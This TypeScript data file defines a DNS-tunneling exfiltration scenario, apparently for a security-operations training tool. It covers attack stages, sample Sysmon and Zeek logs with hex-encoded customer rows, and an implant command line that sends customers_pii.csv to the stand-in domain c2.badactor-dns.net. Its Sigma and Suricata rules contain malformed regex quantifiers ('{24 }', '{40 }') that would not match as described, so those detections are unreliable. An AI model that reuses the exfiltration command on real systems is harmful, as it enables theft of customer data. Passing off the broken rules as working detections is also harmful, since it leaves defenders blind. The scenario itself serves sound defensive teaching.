import { AttackScenario } from './types';

export const DNS_TUNNELING_SCENARIO: AttackScenario = {
  id: 'dns-tunneling-exfil',
  code: 'T1071.004',
  name: 'DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration',
  shortSubtitle: 'Network & Log Analysis · Bypassing Egress Firewall via Recursive DNS',
  category: 'NETWORK_WEB',
  severity: 'HIGH',
  primaryMitrePhase: 7,
  overview: 'When strict egress firewalls block direct HTTP/HTTPS access, malware abuses the internal DNS resolver via DNS Tunneling. Sensitive stolen data is chunked, hex/base32-encoded, and prepended as high-entropy subdomains (<chunk>.c2.badactor-dns.net). When the infected host queries the corporate DNS resolver, recursive resolution forwards the query directly to the attacker authoritative Name Server—exfiltrating data without any direct TCP connection to the outside world.',
  specs: [
    { term: 'MITRE TECHNIQUES', value: 'T1071.004 (DNS C2) · T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)' },
    { term: 'PROTOCOL & PORT', value: 'UDP/53 (DNS Standard Query TXT / A)' },
    { term: 'STATISTICAL IOC', value: 'Subdomain Length > 52 chars · Shannon Entropy > 4.2 bits' },
    { term: 'THREAT TOOLING', value: 'dnscat2 / iodine / Custom Go DNS Exfiltrator' },
  ],
  nodes: [
    {
      id: 'infected_db_host',
      label: 'DB-BACKUP-02',
      sublabel: '10.50.1.12 (Isolated Host)',
      role: 'victim_host',
      x: 16,
      y: 56,
      details: {
        osOrType: 'Isolated Database Backup Host',
        pidOrPort: 'No Direct Internet Access',
        privilege: 'Compromised Host',
        artifacts: ['Process: sync_agent.exe', 'Sysmon EID 22 (DNSEvent)'],
        description: 'Air-gapped/restricted internal server blocked from direct internet egress, permitted only to query internal DNS.' } },
    {
      id: 'corp_firewall',
      label: 'Egress Firewall',
      sublabel: 'Blocks TCP 80/443',
      role: 'firewall_siem',
      x: 42,
      y: 68,
      details: {
        osOrType: 'Next-Gen Perimeter Firewall',
        pidOrPort: 'Policy: Deny All Direct Egress',
        privilege: 'Perimeter Gate',
        artifacts: ['Direct TCP/443 Dropped', 'Recursive UDP/53 from 10.50.1.53 Allowed'],
        description: 'Perimeter firewall dropping direct outbound traffic from DB-BACKUP-02 while permitting UDP/53 from the internal DNS resolver.' } },
    {
      id: 'internal_dns',
      label: 'Internal DNS Resolver',
      sublabel: '10.50.1.53 (Unbound/AD)',
      role: 'dns_resolver',
      x: 48,
      y: 28,
      details: {
        osOrType: 'Corporate Recursive DNS Server',
        pidOrPort: 'UDP/53 · Zeek dns.log',
        privilege: 'Infrastructure Relay',
        artifacts: ['High rate of unique TXT queries to badactor-dns.net', 'Cache Miss Ratio: 100%'],
        description: 'Corporate DNS server acting as an unwitting relay, forwarding uncached subdomain queries to the attacker authoritative NS.' } },
    {
      id: 'attacker_ns',
      label: 'Attacker Auth NS',
      sublabel: 'ns1.badactor-dns.net',
      role: 'attacker',
      x: 84,
      y: 44,
      details: {
        osOrType: 'Rogue Authoritative Name Server',
        pidOrPort: '45.133.1.99:53 (dnscat2 server)',
        privilege: 'Attacker C2 / Exfil Sink',
        artifacts: ['Reassembles hex subdomains into customers.csv', 'Replies with C2 commands in TXT records'],
        description: 'Attacker-controlled authoritative Name Server reassembling subdomain chunks into the stolen file and encoding commands in TXT answers.' } },
  ],
  processTree: [
    {
      pid: 4412,
      ppid: 1900,
      name: 'sync_agent.exe',
      commandLine: 'C:\\ProgramData\\sync_agent.exe --file C:\\Backups\\customers_pii.csv --domain c2.badactor-dns.net',
      user: 'CORP\\svc_backup',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: ['ReadFile("customers_pii.csv")', 'DnsQuery_A(DNS_TYPE_TXT)', 'Sleep(150)'] },
  ],
  stages: [
    {
      index: 1,
      title: 'CHUNK & HEX-ENCODE STOLEN DATA INTO SUBDOMAINS',
      subtitle: 'Sysmon Event ID 22 captures high-entropy DNS query from sync_agent.exe',
      description: 'The exfiltration implant reads customers_pii.csv, splits it into 48-byte chunks, hex-encodes each chunk, and issues a DNS TXT query for <seq>.<hex_data>.c2.badactor-dns.net to the internal resolver (10.50.1.53). Sysmon Event ID 22 on the endpoint logs the exact process (sync_agent.exe) and the anomalous query name.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1048.003',
      mitreTechniqueName: 'Exfiltration Over Unencrypted Non-C2 Protocol',
      activeNodeIds: ['infected_db_host', 'internal_dns'],
      compromisedNodeIds: ['infected_db_host'],
      keySpecs: [
        { term: 'SYSMON EVENT', value: 'Event ID 22 (DNSEvent - DNS Query)' },
        { term: 'QUERY FORMAT', value: '001.4a6f686e2c393831323030.c2.badactor-dns.net' },
        { term: 'SHANNON ENTROPY', value: '4.48 bits/char (Normal domains < 3.2)' },
      ] },
    {
      index: 2,
      title: 'RECURSIVE RELAY THROUGH CORPORATE DNS SERVER',
      subtitle: '100% cache miss forces recursive forwarding to attacker Name Server',
      description: 'Because every subdomain label contains a unique chunk of encrypted data, the internal DNS resolver experiences a 100% cache miss rate. Following standard DNS recursion, 10.50.1.53 forwards every query across the firewall to the authoritative Name Server for badactor-dns.net.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1071.004',
      mitreTechniqueName: 'Application Layer Protocol: DNS',
      activeNodeIds: ['internal_dns', 'corp_firewall', 'attacker_ns'],
      compromisedNodeIds: ['infected_db_host', 'attacker_ns'],
      keySpecs: [
        { term: 'NETWORK LOG', value: 'Zeek dns.log / BIND query.log' },
        { term: 'CACHE MISS RATE', value: '100% Unique Subdomains per parent domain' },
        { term: 'RECORD TYPE', value: 'TXT (qtype = 16) · TTL = 0' },
      ] },
    {
      index: 3,
      title: 'REASSEMBLE EXFILTRATED DATA & RETURN TXT C2 COMMAND',
      subtitle: 'Bidirectional C2 payload returned inside DNS TXT response',
      description: 'The attacker authoritative server strips the hex labels from incoming queries to reconstruct customers_pii.csv, and replies with a DNS TXT record (TTL=0) carrying an encrypted ACK or next C2 task back to the implant.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1071.004',
      mitreTechniqueName: 'Bidirectional DNS Tunneling C2',
      activeNodeIds: ['attacker_ns', 'internal_dns', 'infected_db_host'],
      compromisedNodeIds: ['infected_db_host', 'attacker_ns'],
      keySpecs: [
        { term: 'DNS ANSWER', value: 'TXT "ACK:001:CMD:SLEEP_60"' },
        { term: 'RESPONSE TTL', value: '0 seconds (Prevents DNS caching)' },
        { term: 'MITIGATION', value: 'DNS RPZ (Response Policy Zones) & Entropy Thresholding' },
      ] },
  ],
  telemetry: [
    {
      id: 'dns-1',
      no: 1,
      stageIndex: 1,
      timestamp: '22:10:04.015',
      sourceNodeId: 'infected_db_host',
      targetNodeId: 'internal_dns',
      sourceLabel: '10.50.1.12 (sync_agent)',
      targetLabel: '10.50.1.53:53',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 22',
      shortAction: 'DNS TXT EXFIL',
      info: 'QueryName="001.343130322c616c695f72657a6165692c30393132.c2.badactor-dns.net"',
      sizeOrCode: '112 B',
      severity: 'HIGH',
      mitreId: 'T1048.003',
      explanation: 'Sysmon Event ID 22 links the DNS query directly to C:\\ProgramData\\sync_agent.exe. Decoding the hex subdomain label "343130322c616c695f72657a6165692c30393132" reveals the plaintext CSV row "4102,ali_rezaei,0912"!',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>22</EventID>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-11-12 22:10:04.015</Data>
    <Data Name="ProcessId">4412</Data>
    <Data Name="QueryName">001.343130322c616c695f72657a6165692c30393132.c2.badactor-dns.net</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">type: 16 ACK:001:NEXT;</Data>
    <Data Name="Image">C:\\ProgramData\\sync_agent.exe</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'High-Length Hex/Base64 Subdomain DNS Tunneling Detection',
        ruleCode: `title: Suspicious High-Length DNS Subdomain Query
logsource:
  product: windows
  category: dns_query
detection:
  selection:
    QueryName|re: '^[a-fA-F0-9]{24 }\.'
  condition: selection
level: high`,
        mitigation: 'Alert on high counts of unique subdomain queries per eTLD+1 in SIEM and block Newly Registered Domains (NRDs) via DNS RPZ.' } },
    {
      id: 'dns-2',
      no: 2,
      stageIndex: 2,
      timestamp: '22:10:04.042',
      sourceNodeId: 'internal_dns',
      targetNodeId: 'attacker_ns',
      sourceLabel: '10.50.1.53 (DNS)',
      targetLabel: '45.133.1.99:53',
      sourceType: 'NETWORK',
      protocolOrEventId: 'Zeek dns.log',
      shortAction: 'RECURSIVE TXT',
      info: 'qtype_name=TXT query="001.343130...badactor-dns.net" answers="ACK:001:NEXT" TTL=0',
      sizeOrCode: '164 B',
      severity: 'CRITICAL',
      mitreId: 'T1071.004',
      explanation: 'Zeek dns.log captures the recursive query leaving the internal resolver and returning a TXT record with TTL=0.000000 to bypass caching.',
      rawLog: `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto trans_id query qtype_name rcode_name answers TTLs
1794521404.042 CHhAvVGS1DHFjwGM9 10.50.1.53 58192 45.133.1.99 53 udp 41902 001.343130322c616c695f72657a6165692c30393132.c2.badactor-dns.net TXT NOERROR ACK:001:NEXT 0.000000`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Abnormal Volume of DNS TXT Queries with Zero TTL',
        ruleCode: `alert dns any any -> any any (
  msg:"SOC DNS Tunneling Long Subdomain Label > 40 Chars";
  dns.query; content:"."; pcre:"/^[a-zA-Z0-9]{40 }\./";
  threshold: type both, track by_src, count 10, seconds 30;
  classtype:policy-violation; sid:9004120; rev:1;
)`,
        mitigation: 'Enforce DNS Response Policy Zones (RPZ) and rate-limit outbound TXT/NULL queries to uncategorized domains.' } },
  ] };
